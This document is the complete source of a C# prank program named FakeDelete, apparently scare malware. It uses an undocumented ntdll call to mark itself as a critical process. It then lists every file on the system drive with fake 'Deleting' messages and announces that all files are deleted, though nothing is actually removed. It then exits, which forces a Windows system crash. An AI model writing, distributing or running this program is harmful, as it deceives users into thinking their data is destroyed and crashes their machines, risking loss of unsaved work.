using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FakeDelete {

	class Program {
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		static bool bson_on_exit = true;

		static IEnumerable<String> GetAllFiles(string path, string searchPattern) {
			return System.IO.Directory.EnumerateFiles(path, searchPattern).Union(
			System.IO.Directory.EnumerateDirectories(path).SelectMany(d => {
				try {
					return GetAllFiles(d, searchPattern);
				} catch (Exception e) {
					return Enumerable.Empty<String>();
				}
			}));
		}

		static void Main(string[] args) {
			try {
				int isCritical = 1;
				int BreakOnTermination = 0x1D;
				Process.EnterDebugMode();
				NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
			} catch (Exception e) {
				bson_on_exit = false;
			}
			IEnumerable<String> files = GetAllFiles(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)), "*.*");
			foreach (string file in files) {
				Console.WriteLine("Deleting " + file);
			}
			Console.WriteLine("All files deleted");
			if (bson_on_exit) {
				System.Environment.Exit(0);
			} else {
				Console.ReadLine();
			}
		}
	}
}